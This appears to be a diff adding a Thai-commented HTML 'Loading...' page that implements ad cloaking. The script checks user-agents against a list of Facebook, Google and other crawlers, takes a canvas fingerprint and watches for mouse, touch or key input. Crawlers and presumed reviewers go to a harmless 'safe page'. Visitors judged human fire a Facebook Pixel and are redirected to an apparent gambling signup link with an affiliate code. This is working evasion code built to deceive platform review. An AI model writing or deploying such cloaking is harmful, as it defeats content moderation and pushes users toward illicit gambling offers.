@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- ===== FB Pixel (คนจริงเท่านั้นถึงทำงาน) ===== -->
+  <script>
+    // Pixel จะโหลดเฉพาะถ้าไม่ใช่บอท
+    var runPixel = false;
+    var isHuman = false;
+    var isBot = false;
+    var pixelLoaded = false;
+
+    // ===== Anti-bot User-Agent ตรวจเบื้องต้น =====
+    var botPatterns = [
+      /facebookexternalhit/i,
+      /Facebot/i,
+      /facebookcatalog/i,
+      /Googlebot/i,
+      /bingbot/i,
+      /crawler/i,
+      /spider/i,
+      /Slackbot/i,
+      /Twitterbot/i,
+      /Discordbot/i,
+      /WhatsApp/i
+    ];
+    var ua = navigator.userAgent;
+    for (var i = 0; i < botPatterns.length; i++) {
+      if (botPatterns[i].test(ua)) {
+        isBot = true;
+        break;
+      }
+    }
+
+    // ===== Behavior (ตรวจจับมนุษย์) =====
+    document.addEventListener('mousemove', () => { isHuman = true; });
+    document.addEventListener('touchstart', () => { isHuman = true; });
+    document.addEventListener('keydown', () => { isHuman = true; });
+
+    // ===== Advanced Anti-Bot (Canvas Fingerprint) =====
+    // (เบื้องต้น ถ้าต้องการเพิ่มระดับสูง แนะนำใช้ FingerprintJS library)
+    function hasCanvasFingerprint() {
+      try {
+        var canvas = document.createElement('canvas');
+        var ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillText("test", 2, 2);
+        var fp = canvas.toDataURL();
+        return fp.length > 50; // มนุษย์ browser จะได้ fingerprint, บอทบางตัวจะได้ค่าว่าง/แปลกๆ
+      } catch (e) { return false; }
+    }
+
+    // ===== Main Cloaking Logic =====
+    function cloakLogic() {
+      if (isBot || !hasCanvasFingerprint()) {
+        // ถ้าเจอบอท/ไม่เจอ fingerprint (ส่วนใหญ่คือบอท) = ปล่อยไป safe page
+        window.location.replace("https://www.grabmobile.online/");
+      } else if (!isHuman) {
+        // ไม่ขยับ mouse/touch/keyboard ภายใน 1.5 วินาที = สันนิษฐานเป็นบอท/แอดมิน
+        window.location.replace("https://www.grabmobile.online/");
+      } else {
+        // คนจริง = ยิง pixel + ส่งไป offer/landing page
+        runPixel = true;
+        if (!pixelLoaded) {
+          loadFBPixel();
+          pixelLoaded = true;
+        }
+        setTimeout(function() {
+          window.location.replace("https://m.bk8vip.online/account/signup/ag/vtZMLL");
+        }, 500); // รอให้ pixel ยิงก่อน
+      }
+    }
+
+    // ====== FB Pixel Loader (ยิงเฉพาะคน) ======
+    function loadFBPixel() {
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', 'YOUR_PIXEL_ID'); // <==== ใส่ Pixel ID ของคุณตรงนี้
+      fbq('track', 'PageView');
+    }
+
+    // ====== Wait & Run Main Cloaking ======
+    window.onload = function() {
+      setTimeout(cloakLogic, 1500); // ให้ user มีเวลาแสดง interaction
+    }
+  </script>
+
+  <style>
+    body { display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif; background:#f6f8fa;}
+    h2 { color:#666;font-weight:normal;}
+  </style>
+
+  <!-- FB Pixel fallback noscript (บอทจะเห็น แต่ยิงไม่สำเร็จ) -->
+  <noscript>
+    <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=YOUR_PIXEL_ID&ev=PageView&noscript=1"/>
+  </noscript>
+</head>
+<body>
+  <h2>Loading... กรุณารอสักครู่</h2>
+</body>
+</html>
